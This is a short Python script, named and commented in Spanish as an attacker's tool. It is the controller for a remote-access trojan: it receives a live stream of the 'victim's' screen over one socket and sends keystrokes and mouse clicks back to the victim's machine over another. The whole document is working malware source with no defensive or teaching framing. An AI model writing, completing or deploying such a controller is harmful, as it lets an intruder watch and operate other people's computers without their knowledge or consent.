# luis_attacker.py
import socket
import threading
import cv2
import numpy as np
import pygame
from pygame.locals import *

# Configuración
IP = "0.0.0.0"
PORT_VIDEO = 9998
PORT_INPUT = 9999

# Inicializar Pygame
pygame.init()
screen = pygame.display.set_mode((800, 600))
pygame.display.set_caption("Pantalla de la Víctima")

def receive_video():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((IP, PORT_VIDEO))
    sock.listen(1)
    conn, _ = sock.accept()
    
    while True:
        size_data = conn.recv(4)
        if not size_data:
            break
        size = int.from_bytes(size_data, byteorder="big")
        frame_data = conn.recv(size)
        frame = cv2.imdecode(np.frombuffer(frame_data, np.uint8), cv2.IMREAD_COLOR)
        if frame is not None:
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            frame = pygame.surfarray.make_surface(frame.swapaxes(0, 1))
            screen.blit(frame, (0, 0))
            pygame.display.update()
    
    conn.close()

def send_input_events():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((IP, PORT_INPUT))
    
    while True:
        for event in pygame.event.get():
            if event.type == KEYDOWN:
                sock.send(f"keydown:{event.key}".encode())
            elif event.type == MOUSEBUTTONDOWN:
                sock.send(f"mouse_click:{event.button}".encode())

if __name__ == "__main__":
    video_thread = threading.Thread(target=receive_video)
    input_thread = threading.Thread(target=send_input_events)
    video_thread.start()
    input_thread.start()